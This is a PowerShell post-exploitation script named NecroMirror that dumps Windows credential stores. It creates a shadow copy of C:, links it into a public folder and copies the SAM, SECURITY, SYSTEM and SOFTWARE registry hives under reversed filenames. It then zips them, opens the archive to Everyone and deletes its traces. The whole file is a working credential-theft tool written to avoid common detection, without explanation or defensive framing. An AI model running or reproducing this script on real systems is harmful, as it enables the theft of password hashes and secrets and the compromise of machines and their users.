<#
    Author: vari.sh

    Description: This script dumps SAM, SECURITY, SYSTEM, SOFTWARE without Rubeus or Mimikatz.
                 It creates a shadow copy of C:, mounts it with mklink in C:\Users\Publis\backup,
                 copies the files, compresses them into a ZIP archive, then cleans up.
                 Works with Administrator privileges (SYSTEM not required).
    Usage: .\NecroMirror.ps1
#>

$outputPath = "C:\Users\Public"

Write-Output "[+] Creating shadow copy (CIM method)"
$shadow = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume="C:\\"}

if ($shadow.ReturnValue -ne 0) {
    Write-Error "[-] Failed to create shadow copy. Return code: $($shadow.ReturnValue)"
    exit 1
}

# Get shadow copy object
$shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }
$shadowCopyID   = $shadowCopy.ID
$shadowCopyPath = $shadowCopy.DeviceObject

Write-Output "[*] ShadowCopy UUID: $shadowCopyID"
Write-Output "[*] ShadowCopy Path: $shadowCopyPath"

# Mount shadow copy with mklink
$mountPoint = "$outputPath\backup"
Write-Output "[+] Mounting shadow copy in $mountPoint"
if (Test-Path $mountPoint) { Remove-Item $mountPoint -Recurse -Force }
cmd /c "mklink /d `"$mountPoint`" `"$shadowCopyPath\`""

# Timestamp
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$zipFilePath = "$outputPath\backup_$timestamp.zip"

# Copy registry hives
Write-Output "[+] Copying SAM..."
Copy-Item "$mountPoint\Windows\System32\config\SAM" "$outputPath\${timestamp}_mas"
Write-Output "[+] Copying SECURITY..."
Copy-Item "$mountPoint\Windows\System32\config\SECURITY" "$outputPath\${timestamp}_ytiruces"
Write-Output "[+] Copying SYSTEM..."
Copy-Item "$mountPoint\Windows\System32\config\SYSTEM" "$outputPath\${timestamp}_metsys"
Write-Output "[+] Copying SOFTWARE..."
Copy-Item "$mountPoint\Windows\System32\config\SOFTWARE" "$outputPath\${timestamp}_erawtfos"

# Delete mountpoint
Write-Output "[-] Deleting symlink"
Remove-Item $mountPoint -Force

# Delete shadow copy
Write-Output "[-] Deleting shadow copy"
$shadowCopy | Remove-CimInstance

# Compress files into a ZIP archive
Write-Output "[+] Creating ZIP archive: $zipFilePath"
Compress-Archive -Path "$outputPath\${timestamp}_mas", "$outputPath\${timestamp}_ytiruces", "$outputPath\${timestamp}_metsys", "$outputPath\${timestamp}_erawtfos" -DestinationPath $zipFilePath

# Modify permissions on ZIP
Write-Output "[+] Modifying ZIP file permissions"
$acl = Get-Acl $zipFilePath
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$acl.SetAccessRule($accessRule)
Set-Acl -Path $zipFilePath -AclObject $acl

# Cleanup extracted files
Write-Output "[-] Removing extracted files"
Remove-Item "$outputPath\${timestamp}_mas", "$outputPath\${timestamp}_ytiruces", "$outputPath\${timestamp}_metsys", "$outputPath\${timestamp}_erawtfos" -Force

Write-Output "[+] Operation completed. Archive saved at $zipFilePath"
